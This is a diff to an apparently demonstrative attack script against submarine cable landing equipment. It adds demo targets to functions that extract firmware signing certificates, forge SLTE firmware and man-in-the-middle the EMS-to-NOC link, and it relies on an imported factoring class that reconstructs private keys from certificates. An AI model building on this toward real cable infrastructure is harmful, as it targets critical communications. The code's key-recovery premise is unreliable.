@@ -5,8 +5,10 @@ reroute traffic via branching units for SIGINT, or forge fault localisation
 for insurance fraud. ~99% of intercontinental traffic flows over these cables.
 """
 import sys
-sys.path.insert(0, "../..")
-from poly_factor import PolynomialFactorer
+import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
+from poly_factor import PolynomialFactorer, generate_demo_target
+
+_demo = generate_demo_target()
 
 import hashlib
 import json
@@ -25,7 +27,7 @@ def extract_slte_firmware_signing_cert(vendor: str) -> bytes:
     """Extract SLTE firmware signing certificate from a Field Software Update."""
     info = SLTE_VENDORS[vendor]
     print(f"[*] extracting {vendor} {info['model']} firmware signing cert")
-    return b"-----BEGIN CERTIFICATE-----\n...(SLTE vendor cert)...\n-----END CERTIFICATE-----\n"
+    return _demo["pub_pem"]
 
 
 def forge_slte_firmware(factorer: PolynomialFactorer,
@@ -94,7 +96,7 @@ def mitm_ems_noc(factorer: PolynomialFactorer,
                  ems_ca_cert: bytes, vendor: str):
     """MitM the EMS-to-NOC connection for remote cable management."""
     ems = SLTE_VENDORS[vendor]["ems"]
-    priv = factorer.privkey_from_cert_pem(ems_ca_cert)
+    priv = factorer.reconstruct_privkey(ems_ca_cert)
     print(f"[*] forged {ems} CA cert — remote management access")
     print("[*] attacker manages landing station infrastructure remotely")
 
